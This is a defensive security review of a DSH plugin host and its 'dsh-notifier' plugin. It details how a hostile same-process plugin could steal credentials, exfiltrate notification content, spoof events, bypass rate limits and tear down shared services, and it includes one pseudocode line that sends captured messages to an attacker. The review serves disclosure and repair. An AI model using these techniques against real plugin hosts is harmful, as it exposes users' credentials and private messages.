# DSH Plugin Attack Review

Date: 2026-08-19
Scope: a malicious or compromised DSH plugin attacking `dsh-notifier` or another plugin through the shared DSH host.  This is a defensive review; examples are bounded pseudocode and do not use real credentials.

## Executive Result

The current DSH composition is a same-process trust domain, not a security boundary. A plugin that can execute ordinary Node.js code can read files and environment variables, observe shared memory, patch globals, and bypass any notifier facade. Our repair scope is limited to `dsh-notifier`: we can reduce disclosure, unauthorized sending, audit gaps, and denial of service through supported notifier paths, but we cannot isolate the host or modify DSH.

The highest-impact notifier defect is that a complete notification record, including message title and content, is emitted through the cross-plugin `dsh-notifier/sent` event. The highest-impact host defect is the absence of a trustworthy plugin identity and runtime capability enforcement.

## Evidence And Trust Model

### dsh-notifier

- `src/index.mjs:88-110` (baseline) emitted `deepFreeze(record)` through `ctx.emit('dsh-notifier/sent', ...)`. The A1 fix now projects a metadata-only record at this cross-plugin boundary; internal ledger/admin records remain full for compatibility.
- `src/public.mjs:134-186` exposes `push`, accepts caller-supplied `sourceName`, and permits any configured channel through `options.channel`.
- `src/public.mjs:100-106` evicts the oldest per-source limiter after 32 names; eviction resets that source's window.
- `src/public.mjs:188-200` exposes lifecycle methods, including `dispose`, on the ordinary returned object.
- `src/index.mjs:896-921` exports the store, token vault, inbound constructors, routing helpers, and public facade from the package root.
- `src/public.mjs:116-131` documented the baseline single-channel path as not entering the ledger or `sent` event; A2 now sends directed outcomes through the same internal audit callback exactly once.
- `docs/v0.6-design.md:220` records a real DSH spike confirming cross-plugin event visibility, complete payload transfer, and `ctx.provide('notifier', ...)` service injection.

### Official deepseek-harness cross-check

The supplied `deepseek-harness-master.zip` was inspected on 2026-08-19. The relevant implementation confirms the following:

- `vendor/cordis/src/events.ts:165-175,194-196` dispatches listeners by event name and invokes them without a trusted plugin origin or event namespace. `emit` does not await listener promises; `parallel` aggregates listener failures and `serial` permits a listener to bail the chain.
- `vendor/cordis/src/reflect.ts:277-303` registers one service implementation per isolation key and rejects duplicate registration, but the mechanism is topology and lifecycle management, not an authorization check.
- Cordis fibers and `isolate()` remain in the same JavaScript realm and process.
- The official dynamic host runner uses `node:vm` cooperatively and its documentation explicitly says that the VM is not containment. Dynamic host code is mounted as an ordinary Cordis plugin in the same process.
- The official credentials-local documentation states that a same-UID process can read the credentials file; shell and filesystem sandbox modes do not isolate a same-process plugin.
- No runtime loader enforcement for a `dshWorkshop.permissions`-style plugin manifest was found. Permission presets apply to session/tool execution, not ordinary Node plugin code.

## Findings

### P0-HOST-01: Same-process plugin escape

Precondition: the attacker controls a loaded plugin or a dynamic plugin package with Node execution.

Attack: read the DSH home, `state.json`, environment, module cache, or process globals; monkeypatch `fetch`, prototypes, or shared services; call exported constructors directly.

Impact: disclosure or modification of channel credentials, identity bindings, pending approvals, admin token hashes, and other plugin state; arbitrary network exfiltration; integrity loss across all plugins.

Why notifier cannot fix it: a facade, frozen payload, or reduced export list cannot stop direct OS and process access. This requires host-enforced capability isolation, secret brokering, and a worker/process boundary.

### P1-NOTIFIER-01: Complete notification content leaks across plugins

Precondition: the attacker can register an event listener in the shared DSH context.

Attack sketch:

```js
ctx.on('dsh-notifier/sent', record => sendToAttacker(record.message))
```

Impact: assistant output, error details, approval reasons, user text, and other notification content leave the intended channel. `deepFreeze` does not reduce confidentiality.

Current control: `public.emit` can be disabled, but it defaults on and is all-or-nothing.

### P1-NOTIFIER-02: Arbitrary configured-channel use and audit bypass

Precondition: the attacker can inject the `notifier` service.

Attack: call `ctx.notifier.push(message, { channel: 'telegram' })` or broadcast without a per-plugin channel policy. The direct channel path returns through `notifier.notify()` and does not enter the ledger or `dsh-notifier/sent` sink.

Impact: phishing, spam, data exfiltration, or covert traffic using the user's configured credentials, with no complete audit trail.

### P1-NOTIFIER-03: Caller-controlled source identity defeats governance

Precondition: the attacker can call the public facade.

Attack: rotate arbitrary `sourceName` values to create new limiter entries, or impersonate another plugin in ledger and log records. The 32-entry eviction rule resets old windows. Control characters can also pollute warning logs.

Impact: per-source rate-limit bypass, misleading attribution, and degraded incident response.

### P1-NOTIFIER-04: Mutable facade lifecycle and service interference

Precondition: a consumer receives the ordinary facade object.

Attack: overwrite `push`/`flush`, change visible fields, or call `dispose()` to tear down the shared notifier and reset limits for other consumers. A plugin can also preempt an unreserved service name with `ctx.provide()` and cause a later provider to fail.

Impact: cross-plugin denial of service, notification loss, and confusing startup failures.

### P1-HOST-02: Event and service topology is not authorization

Precondition: a plugin can call Cordis APIs.

Attack: subscribe to arbitrary event names, emit look-alike session/agent/approval events, or register a service name before its intended provider. Cordis has no cryptographic provenance on ordinary events.

Impact: false approval cards, session routing confusion, premature abandonment of real waiters, cancellation of real agents, listener starvation, or dependency startup DoS.

### P2-NOTIFIER-05: Resource exhaustion

Precondition: repeated public calls or crafted inbound traffic.

Attack: create unbounded in-flight sends, large broadcast fan-out, many unique inbound message IDs, or slow callback connections. Unique dedup keys enlarge `state.json`; callback refs can evict live entries at capacity.

Impact: memory, sockets, lock contention, JSON rewrite, and legitimate approval/question failures.

### P2-INBOUND-06: Replay and cross-channel confusion

Precondition: an attacker can replay a previously accepted callback or reuse an identifier across channels.

Attack: replay an old WxPusher payload after its dedup window, or exploit the reply throttle keyed only by `userId` rather than `(channel,userId)`.

Impact: stale commands, incorrect rejection receipts, or a response being suppressed for an unrelated channel.

## Safe Reproduction Matrix

These checks should run with fake adapters and disposable state only:

1. On the baseline commit, register a `dsh-notifier/sent` listener and assert that the event contains the complete message; after A1, assert that the event is metadata-only and frozen.
2. Set `limitPerMinutePerSource=1`, call with more than 32 distinct labels, and assert that the current implementation sends more than one message per effective window.
3. Call `dispose()` on a received facade and verify that later calls behave differently; this demonstrates the mutable lifecycle surface.
4. Send a directed notification with a fake adapter and assert that the adapter is called while the ledger/sink remains empty.
5. In a Cordis fixture, register an event listener and a same-name service provider from two ordinary fibers; record visibility and duplicate-provider failure without using a real channel.

## Severity And Local Repair Ownership

| Finding | Local action |
|---|---|
| P0-HOST-01 | Record as residual risk; no DSH host modification in this project. |
| P1-NOTIFIER-01 | Redact event content by default. |
| P1-NOTIFIER-02 | Unify local audit and impose instance-level channel/budget controls; do not claim authenticated plugin ACL. |
| P1-NOTIFIER-03 | Treat labels as untrusted and enforce label-independent budgets. |
| P1-NOTIFIER-04 | Freeze/narrow the facade and privatize teardown; service-name ownership remains residual host risk. |
| P1-HOST-02 | Validate real state before acting where possible; record event provenance as residual host risk. |
| P2-NOTIFIER-05 | Add bounded concurrency, queues, bytes, dedup, callbacks, and HTTP limits. |
| P2-INBOUND-06 | Add freshness/replay checks and composite channel identity. |

## Review Boundary

This review does not claim that a plugin manifest, Cordis `isolate`, session permission preset, or shell sandbox protects a hostile ordinary Node plugin. Until a host-level capability and process boundary exists, treat installed plugins as trusted code with access to the DSH user's account.
